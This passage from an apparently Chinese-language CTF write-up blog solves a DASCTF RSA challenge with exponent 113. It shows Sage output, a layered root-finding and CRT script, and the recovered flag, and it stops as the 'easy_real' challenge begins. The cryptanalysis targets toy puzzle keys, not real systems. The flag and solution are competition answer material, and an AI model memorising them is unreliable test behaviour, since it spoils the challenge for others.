527047155800840593369140310256885301274622245610009509121333858627158271116419456151449561049622379237851374997]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">8</span><br><span class="line">c 851834034713920072016294826766890940103178167607817794715692270318536007164857863881508649769981422663639184163</span><br><span class="line"><span class="selector-tag">p</span> 37185691759470013533730603170661686570987787098353146897</span><br><span class="line"><span class="selector-tag">q</span> 41680117092754807988080699273322244961911189757589699867</span><br><span class="line">上一个n 19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437</span><br><span class="line"><span class="selector-attr">[5772224180179962397158418478468305994920422145855450551932850591253169055736728137194928021864521464661511]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">7</span><br><span class="line">c 5772224180179962397158418478468305994920422145855450551932850591253169055736728137194928021864521464661511</span><br><span class="line"><span class="selector-tag">p</span> 135813272566456906193934636644217527100917542578856697</span><br><span class="line"><span class="selector-tag">q</span> 140758317578347635848563045232314610161039815135897421</span><br><span class="line">上一个n 222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489</span><br><span class="line"><span class="selector-attr">[201270414263671865648131358230135006175090857068415686069148837994386901812348962669414590276244279652]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">6</span><br><span class="line">c 201270414263671865648131358230135006175090857068415686069148837994386901812348962669414590276244279652</span><br><span class="line"><span class="selector-tag">p</span> 385788223643735590500185001710758495904528462058461</span><br><span class="line"><span class="selector-tag">q</span> 576581905150085393327734090419529952232186498060949</span><br><span class="line">上一个n 4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771</span><br><span class="line"><span class="selector-attr">[1631195497375922229848480131202350147418728908365651197102485655617240528564830722486663140830762]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">5</span><br><span class="line">c 1631195497375922229848480131202350147418728908365651197102485655617240528564830722486663140830762</span><br><span class="line"><span class="selector-tag">p</span> 1656848589754467667368312855929759764100120657831</span><br><span class="line"><span class="selector-tag">q</span> 2714357008989072105081411295741540337141142641741</span><br><span class="line">上一个n 84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641</span><br><span class="line"><span class="selector-attr">[83436593835736927783034931301466249878138772728555530531816534785622373800125814331410735801, 541028901037423648292648425333532314938480435681509712968388151546772635406670001849006961]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">4</span><br><span class="line">c 83436593835736927783034931301466249878138772728555530531816534785622373800125814331410735801</span><br><span class="line"><span class="selector-tag">p</span> 7832299017937880395583715032476962329929226581</span><br><span class="line"><span class="selector-tag">q</span> 10726403821316775206273675267109184566904426261</span><br><span class="line">上一个n 1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493</span><br><span class="line"><span class="selector-attr">[612402625116056383171913080691265536933185153779141510100715847406642891544437819056399]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">3</span><br><span class="line">c 612402625116056383171913080691265536933185153779141510100715847406642891544437819056399</span><br><span class="line"><span class="selector-tag">p</span> 24335212484189159197840692460327461505035059</span><br><span class="line"><span class="selector-tag">q</span> 43974782968656404951924524450501283426052127</span><br><span class="line">上一个n 7783503593765446343363083302704731608384677185199537317445372251030064778965500447</span><br><span class="line"><span class="selector-attr">[7523449601904104920623925101649366402016181450187359849499567637389273313904203215]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">2</span><br><span class="line">c 7523449601904104920623925101649366402016181450187359849499567637389273313904203215</span><br><span class="line"><span class="selector-tag">p</span> 88067722275537586769787599991567203589751</span><br><span class="line"><span class="selector-tag">q</span> 88380889077762105057154017276462714444697</span><br><span class="line">上一个n 68506321231437453734007374706367120760326482177047006099953454136095248103663</span><br><span class="line"><span class="selector-attr">[23388304805925808822689623463866376122782272519632037291479310043364093060855]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1</span><br><span class="line">c 23388304805925808822689623463866376122782272519632037291479310043364093060855</span><br><span class="line"><span class="selector-tag">p</span> 232079231415308325450092906880606082069</span><br><span class="line"><span class="selector-tag">q</span> 295185057334340451492588650872876746227</span><br><span class="line">上一个n 1134876149917575363176366704410565158549594427794901202977560677131703617</span><br><span class="line"><span class="selector-attr">[53296318153341311013989348488093143123693921875654781175946491674187297]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0</span><br><span class="line">c 53296318153341311013989348488093143123693921875654781175946491674187297</span><br><span class="line"><span class="selector-tag">p</span> 953730950786751671162019537171974567</span><br><span class="line"><span class="selector-tag">q</span> 1189933229053113361422958527792232151</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">TypeError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="selector-tag">input</span>-39-193924cf64b6&gt; in &lt;module&gt;</span><br><span class="line">    119     eval(&quot;q.append(q&#123;<span class="number">0</span>&#125;)&quot;<span class="selector-class">.format</span>(i))</span><br><span class="line">    120     print(&#x27;q&#x27;, q[-Integer(<span class="number">1</span>)])</span><br><span class="line">--&gt; 121     eval(&quot;n_.append(n&#123;<span class="number">0</span>&#125;)&quot;<span class="selector-class">.format</span>(i-Integer(<span class="number">1</span>)))</span><br><span class="line">    122     print(&quot;上一个n&quot;, n_[-Integer(<span class="number">1</span>)])</span><br><span class="line">    123     solve(p[-Integer(<span class="number">1</span>)], <span class="selector-tag">q</span><span class="selector-attr">[-Integer(1)]</span>, c, e, n_<span class="selector-attr">[-Integer(1)]</span>)</span><br><span class="line"></span><br><span class="line">&lt;string&gt; in &lt;module&gt;</span><br><span class="line"></span><br><span class="line">TypeError: unsupported operand type(s) for -: <span class="string">&#x27;function&#x27;</span> and <span class="string">&#x27;int&#x27;</span></span><br></pre></td></tr></table></figure><p><strong>报错是在预期内的。</strong><br>因为对于flag这一组的加密而言，没有n_（<strong>再上一组的n</strong>）了</p><p>此时，单独拿出c、p、q, 解出的m转byte</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#脚本<span class="number">2</span></span><br><span class="line">#Sage</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">c = <span class="number">53296318153341311013989348488093143123693921875654781175946491674187297</span></span><br><span class="line">p = <span class="number">953730950786751671162019537171974567</span></span><br><span class="line">q = <span class="number">1189933229053113361422958527792232151</span></span><br><span class="line">e = <span class="number">113</span></span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp in mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq in mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="keyword">int</span>(x), <span class="keyword">int</span>(y)], [p, q])</span><br><span class="line">        print(libnum.n2s(<span class="keyword">int</span>(solution)))</span><br></pre></td></tr></table></figure><p>得到多组乱码<br>根据题目中flag格式<code>flag=b&#39;DASCTF&#123;????????????????????&#125;&#39;</code>，搜索DASCTF，得解。</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">b&quot;s*<span class="symbol">\x</span>fc<span class="symbol">\x</span>ec<span class="symbol">\x</span>a2<span class="symbol">\x</span>f4<span class="symbol">\x</span>cec<span class="symbol">\x</span>cf&#x27;<span class="symbol">\r</span>(a<span class="symbol">\x</span>02<span class="symbol">\x</span>86<span class="symbol">\x</span>de<span class="symbol">\x</span>ed<span class="symbol">\x</span>bc<span class="symbol">\x</span>9dwO<span class="symbol">\x</span>0f<span class="symbol">\x</span>d1Va,<span class="symbol">\x</span>e1<span class="symbol">\x</span>eeP<span class="symbol">\x</span>18&quot;</span><br><span class="line">b&#x27;<span class="symbol">\x</span>97<span class="symbol">\x</span>a9<span class="symbol">\x</span>07<span class="symbol">\x</span>d7<span class="symbol">\x</span>d3<span class="symbol">\x</span>a5<span class="symbol">\x</span>03<span class="symbol">\x</span>06<span class="symbol">\x</span>abz<span class="symbol">\x</span>a9&amp;<span class="symbol">\x</span>e1<span class="symbol">\x</span>fcI<span class="symbol">\x</span>c2Me<span class="symbol">\x</span>f9<span class="symbol">\x</span>bf<span class="symbol">\x</span>d9<span class="symbol">\x</span>b5<span class="symbol">\x</span>bdC]a<span class="symbol">\x</span>d0;sZ&#x27;</span><br><span class="line">b&#x27;2<span class="symbol">\x</span>d5<span class="symbol">\x</span>d4<span class="symbol">\x</span>17<span class="symbol">\x</span>e7O<span class="symbol">\x</span>06<span class="symbol">\x</span>e5<span class="symbol">\x</span>e7<span class="symbol">\x</span>13<span class="symbol">\x</span>85<span class="symbol">\x</span>a8<span class="symbol">\x</span>bb<span class="symbol">\x</span>12<span class="symbol">\x</span>b9<span class="symbol">\x</span>90<span class="symbol">\x</span>b910V<span class="symbol">\x</span>0eVk<span class="symbol">\x</span>c4<span class="symbol">\x</span>98<span class="symbol">\x</span>9f<span class="symbol">\x</span>ed<span class="symbol">\t</span>t<span class="symbol">\x</span>86&#x27;</span><br><span class="line">b&#x27;DASCTF&#123;s4g3m4th_i5_co0l!&#125;&#x27;</span><br><span class="line">b&#x27;$<span class="symbol">\x</span>83<span class="symbol">\x</span>fcx<span class="symbol">\x</span>9eD<span class="symbol">\x</span>d3<span class="symbol">\x</span>a5<span class="symbol">\x</span>06<span class="symbol">\n</span>J<span class="symbol">\x</span>baoI<span class="symbol">\x</span>9e<span class="symbol">\x</span>14<span class="symbol">\x</span>80+G4<span class="symbol">\x</span>8b<span class="symbol">\x</span>9015? LA<span class="symbol">\x</span>e7<span class="symbol">\x</span>e8&#x27;</span><br><span class="line">b&#x27;&#125;<span class="symbol">\x</span>9e!<span class="symbol">\x</span>1e<span class="symbol">\x</span>9c<span class="symbol">\x</span>c8<span class="symbol">\x</span>a2n&quot;<span class="symbol">\x</span>ee#<span class="symbol">\x</span>83<span class="symbol">\x</span>b8!<span class="symbol">\x</span>d5c<span class="symbol">\x</span>9c9[<span class="symbol">\x</span>b5F~<span class="symbol">\x</span>a0<span class="symbol">\x</span>b8<span class="symbol">\x</span>e3<span class="symbol">\x</span>b1R<span class="symbol">\x</span>e2&#125;<span class="symbol">\x</span>ea&#x27;</span><br><span class="line">b&quot;<span class="symbol">\x</span>1a<span class="symbol">\x</span>92&#123;&#x27;<span class="symbol">\x</span>f0?zO<span class="symbol">\x</span>f5<span class="symbol">\r</span>L<span class="symbol">\x</span>1d<span class="symbol">\x</span>11N?<span class="symbol">\x</span>13<span class="symbol">\x</span>c3<span class="symbol">\x</span>b2<span class="symbol">\x</span>08<span class="symbol">\x</span>d2&#123;<span class="symbol">\x</span>d7s<span class="symbol">\x</span>da0=h<span class="symbol">\x</span>16G<span class="symbol">\x</span>f8&quot;</span><br></pre></td></tr></table></figure><p><strong>DASCTF{s4g3m4th_i5_co0l!}</strong></p><h4 id="总代码"><a href="#总代码" class="headerlink" title="总代码"></a>总代码</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"></span><br><span class="line">n0 = <span class="number">1134876149917575363176366704410565158549594427794901202977560677131703617</span></span><br><span class="line">n1 = <span class="number">68506321231437453734007374706367120760326482177047006099953454136095248103663</span></span><br><span class="line">n2 = <span class="number">7783503593765446343363083302704731608384677185199537317445372251030064778965500447</span></span><br><span class="line">n3 = <span class="number">1070135687488356161164202697449500843725645617129661751744246979913699130211505096520493</span></span><br><span class="line">n4 = <span class="number">84012402115704505952834528733063574032699054524475028392540927197962976150657887637275643641</span></span><br><span class="line">n5 = <span class="number">4497278582433699034700211877087309784829036823057043402314297478185216205338241432310114079123771</span></span><br><span class="line">n6 = <span class="number">222438508972972285373674471797570608108219830357859030918870564627162064662598790037437036093579139489</span></span><br><span class="line">n7 = <span class="number">19116847751264029874551971240684579996570601026679560309305369168779130317938356692609176166515369250878437</span></span><br><span class="line">n8 = <span class="number">1549903986709797721131070830901667744892392382636347158789834851868638863292232718716074359148785900673192362699</span></span><br><span class="line">n9 = <span class="number">62387766690725996279968636478698222263235233511074646032501495855928095611796694112573478405813305623307157261619643</span></span><br><span class="line">n10 = <span class="number">1496134688150941811618178638810353297864345150241986530472328508974364124440160181353848429438725939837967063441528305921</span></span><br><span class="line">n11 = <span class="number">128744123633657656499069966444992201456797762973822340505291131642660343436783413140023509983315177426811890315424928661125061</span></span><br><span class="line">n12 = <span class="number">6917342652058596217869122177298094984415751234677039849514181349685079073411591975537016273056773954075238307918266361998553646469</span></span><br><span class="line">n13 = <span class="number">1999306851167477770905800721615579416365273707414308684419794311809177595829473632853128686208533753019224536487399393397120864878000113</span></span><br><span class="line">n14 = <span class="number">138594056023048386926766329537127538558164718841925506735112367176642328352257472034381662493666299220910783237918231719166519833124529218331</span></span><br><span class="line">n15 = <span class="number">8397272388904583425531462714999219642572091279898695377838194583995214737828538895164195817973441184775814069396690436662985593377966417476040659</span></span><br><span class="line">n16 = <span class="number">83372889332166088651413254885376085265561130214754686361784964744744711092668473281132249352040520639092871294276293287744276919265091479681667169671</span></span><br><span class="line">n17 = <span class="number">10684953914628370830889219903654707140968094024767031366624595731918523435466123514094659595357231410471738736952266383928737163485550013190959149252435167</span></span><br><span class="line">n18 = <span class="number">428359134899960532964729749713513106760306719712194950954567619156985067322564731294653991204666853689688900339268764469280769569535109069729404621290809120793</span></span><br><span class="line">n19 = <span class="number">24491413133428851306933688733518898516890217803647806829002775935975741568422047344206442746983871735723486865901743352102305801200224958166496937663406627341150101</span></span><br><span class="line">n20 = <span class="number">2247517335600310176909964109060502815240207684510918447209767597511414934626668616704865548059751008841620288545344598917362752622130186820039265603312354963258673860579</span></span><br><span class="line">n21 = <span class="number">157978379942536176944325875241196121764116712487226808271002140500926678942090491383544034591205964958130852055691446362753906164711087278555153881606839791499207025307202087</span></span><br><span class="line">n22 = <span class="number">43938571869497484913682975192955012614794498816057204091016374302341854100775132924321569876797699342959191646206571444845883942305710956894334106963321644724361549027630634869933</span></span><br><span class="line">n23 = <span class="number">2609065298534470914730686454716224905333131812890643378630636043224255484662185236061585264231004975072801053316107165770342161619265243081616632312934742288262985830181883449780965531</span></span><br><span class="line">n24 = <span class="number">222235907202454132555071455958700740228567465616560859711214102245461514428187391909176054661864893645713338391509536653547350134615807194339839952004333949540567943568810413945779642106201</span></span><br><span class="line">n25 = <span class="number">44890472824427626252451120059527486677662371033945481542195354255473403815853320591468917295474578271680865394304946847791535710766947049195816261224382109115684638995528332538466194474846836399</span></span><br><span class="line">n26 = <span class="number">1062789633774349417938788353001516763303743389381120380522262327123099728631034935663418832664265833959487018276693680850987382421521055508477988016246558095545925414048663082368488342633334571240563</span></span><br><span class="line">e = <span class="number">113</span></span><br><span class="line">c = <span class="number">1028324919038104683475485759234995158466543298184637219012354053883391759172761125802189697762778242175407876548832454351014064525118465877297277847501477586955680645311999174005606833294172830817159</span></span><br><span class="line"></span><br><span class="line">p26 = <span class="number">978009050697262759337388871320370165458800566798280419667959552859180906066907114053826258140106617</span></span><br><span class="line">q26 = <span class="number">1086686910531802445146659484012613083647370307628438760118376029969836222533970554565751069314622539</span></span><br><span class="line">p25 = <span class="number">5952590790902091635268726673538951527433355660839816621733964706901441977862333411532558667717227</span></span><br><span class="line">q25 = <span class="number">7541333580839789645678699855290145212677767915429008863004397257213367753100058966625356835737037</span></span><br><span class="line">p24 = <span class="number">14702310219802004876082313481498680940324963613770096574742182597840558294030859405666549879531</span></span><br><span class="line">q24 = <span class="number">15115713372931874518523751684548940147062395364112500028355694776530968944848166318295947674571</span></span><br><span class="line">p23 = <span class="number">43870497594014737833600078975099212558645315030912084285417550950854483979406797450479252891</span></span><br><span class="line">q23 = <span class="number">59471978701477648587546053450213894562580907285714122639903144859545186463681183925646967041</span></span><br><span class="line">p22 = <span class="number">206721456778089912780641186795393376537372828449722520397829606593267585681448641482345737</span></span><br><span class="line">q22 = <span class="number">212549643149353357950643557614966235999942509894271006476145929120541407503538644651435909</span></span><br><span class="line">p21 = <span class="number">368461902207817023013078031477042541053987571003677386333567043030477451518424731838173</span></span><br><span class="line">q21 = <span class="number">428750921047556327595864876619292414694543668237320723518704707914310601565770504401619</span></span><br><span class="line">p20 = <span class="number">1328165608715012145707239303399129070657427496129541416861187541092152796676371237057</span></span><br><span class="line">q20 = <span class="number">1692196606246085729483398884059069884182535824953762329164855466589577530953493347747</span></span><br><span class="line">p19 = <span class="number">4479430800690915874719403516331677127806963529247809966024777708496270901092401687</span></span><br><span class="line">q19 = <span class="number">5467527956822382309398095704409409074818664888285375307055715842283183939297839923</span></span><br><span class="line">p18 = <span class="number">15874438801602936764330936047390981280096007684699625987478211613419079727910193</span></span><br><span class="line">q18 = <span class="number">26984206512970181742033712455904984758134288864531714209886622060356697128804201</span></span><br><span class="line">p17 = <span class="number">102366458668689911004027849640392002821642295855327735994412634235696717329671</span></span><br><span class="line">q17 = <span class="number">104379442774418262390337411577160146519860415840398189010112686742489182665577</span></span><br><span class="line">p16 = <span class="number">262775599542220820608778738911414710660835549772895468394761119434220071003</span></span><br><span class="line">q16 = <span class="number">317277895959173163347650321012213555955385929418622006880521870012130207557</span></span><br><span class="line">p15 = <span class="number">2623629589005115152329094552749299711026240699896424120660145647226563547</span></span><br><span class="line">q15 = <span class="number">3200631836176555526009533059891690177091538103904679780020639896015937897</span></span><br><span class="line">p14 = <span class="number">11136261905010083405430254612464029672882837025885682392810368001188527</span></span><br><span class="line">q14 = <span class="number">12445294229358634680867170058509842935273054334385354032543323581223253</span></span><br><span class="line">p13 = <span class="number">43449898447639409732732812916430042263570178747794530133229640125923</span></span><br><span class="line">q13 = <span class="number">46014074200352892806829193743016415423205917845271691428043440245531</span></span><br><span class="line">p12 = <span class="number">66882708962198932251728043152245270662769508317424500666902658099</span></span><br><span class="line">q12 = <span class="number">103424977238409568447978495499643051307907366367259219393937014631</span></span><br><span class="line">p11 = <span class="number">350121371461894793578110243222665782247737840410076591434903787</span></span><br><span class="line">q11 = <span class="number">367712839396521757736384350030802803477965822058616833553305103</span></span><br><span class="line">p10 = <span class="number">954412804126450754097808991490470782833291028309980575506163</span></span><br><span class="line">q10 = <span class="number">1567597041534155679238655992215022394597376421096298363211067</span></span><br><span class="line">p9 = <span class="number">6623023178993627032758350846838617937710601663528839184727</span></span><br><span class="line">q9 = <span class="number">9419832152875820180139633405089278278408407453522978357309</span></span><br><span class="line">p8 = <span class="number">37185691759470013533730603170661686570987787098353146897</span></span><br><span class="line">q8 = <span class="number">41680117092754807988080699273322244961911189757589699867</span></span><br><span class="line">p7 = <span class="number">135813272566456906193934636644217527100917542578856697</span></span><br><span class="line">q7 = <span class="number">140758317578347635848563045232314610161039815135897421</span></span><br><span class="line">p6 = <span class="number">385788223643735590500185001710758495904528462058461</span></span><br><span class="line">q6 = <span class="number">576581905150085393327734090419529952232186498060949</span></span><br><span class="line">p5 = <span class="number">1656848589754467667368312855929759764100120657831</span></span><br><span class="line">q5 = <span class="number">2714357008989072105081411295741540337141142641741</span></span><br><span class="line">p4 = <span class="number">7832299017937880395583715032476962329929226581</span></span><br><span class="line">q4 = <span class="number">10726403821316775206273675267109184566904426261</span></span><br><span class="line">p3 = <span class="number">24335212484189159197840692460327461505035059</span></span><br><span class="line">q3 = <span class="number">43974782968656404951924524450501283426052127</span></span><br><span class="line">p2 = <span class="number">88067722275537586769787599991567203589751</span></span><br><span class="line">q2 = <span class="number">88380889077762105057154017276462714444697</span></span><br><span class="line">p1 = <span class="number">232079231415308325450092906880606082069</span></span><br><span class="line">q1 = <span class="number">295185057334340451492588650872876746227</span></span><br><span class="line">p0 = <span class="number">953730950786751671162019537171974567</span></span><br><span class="line">q0 = <span class="number">1189933229053113361422958527792232151</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">p, q, c, e, n_</span>):</span></span><br><span class="line"></span><br><span class="line">    P.&lt;a&gt;= PolynomialRing(Zmod(p), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    f = a ^ e - c</span><br><span class="line">    mps = f.monic().roots()</span><br><span class="line"></span><br><span class="line">    P.&lt;a&gt;= PolynomialRing(Zmod(q), implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">    g = a ^ e - c</span><br><span class="line">    mqs = g.monic().roots()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">        x = mpp[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">            y = mqq[<span class="number">0</span>]</span><br><span class="line">            solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">            <span class="keyword">if</span> solution &lt; n_:</span><br><span class="line">                solutions.append(solution)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = []</span><br><span class="line">q = []</span><br><span class="line">n_ = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">27</span>):</span><br><span class="line">    solutions = []</span><br><span class="line">    i = <span class="number">26</span> - i</span><br><span class="line">    <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;c&quot;</span>, c)</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;p.append(p&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;p&#x27;</span>,p[-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;q.append(q&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(i))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;q&#x27;</span>, q[-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">&quot;n_.append(n&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(i-<span class="number">1</span>))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;上一个n&quot;</span>, n_[-<span class="number">1</span>])</span><br><span class="line">    solve(p[-<span class="number">1</span>], q[-<span class="number">1</span>], c, e, n_[-<span class="number">1</span>])</span><br><span class="line">    <span class="built_in">print</span>(solutions)</span><br><span class="line">    <span class="keyword">if</span> i == <span class="number">21</span>:</span><br><span class="line">        c = solutions[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">9</span>:</span><br><span class="line">        c = solutions[-<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">elif</span> i==<span class="number">5</span>:</span><br><span class="line">        c = solutions[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        c = solutions[-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p = p[-<span class="number">1</span>]</span><br><span class="line">q = q[-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(p),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">f=a^e-c</span><br><span class="line">mps=f.monic().roots()</span><br><span class="line"></span><br><span class="line">P.&lt;a&gt;=PolynomialRing(Zmod(q),implementation=<span class="string">&#x27;NTL&#x27;</span>)</span><br><span class="line">g=a^e-c</span><br><span class="line">mqs=g.monic().roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> mpp <span class="keyword">in</span> mps:</span><br><span class="line">    x=mpp[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> mqq <span class="keyword">in</span> mqs:</span><br><span class="line">        y=mqq[<span class="number">0</span>]</span><br><span class="line">        solution = CRT_list([<span class="built_in">int</span>(x), <span class="built_in">int</span>(y)], [p, q])</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;DASCTF&quot;</span> <span class="keyword">in</span> <span class="built_in">str</span>(libnum.n2s(<span class="built_in">int</span>(solution))):</span><br><span class="line">            <span class="built_in">print</span>(libnum.n2s(<span class="built_in">int</span>(solution)).decode())</span><br></pre></td></tr></table></figure><h3 id="easy-real"><a href="#easy-real" class="headerlink" title="easy_real"></a>easy_real</h3><h4 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">flag = <span 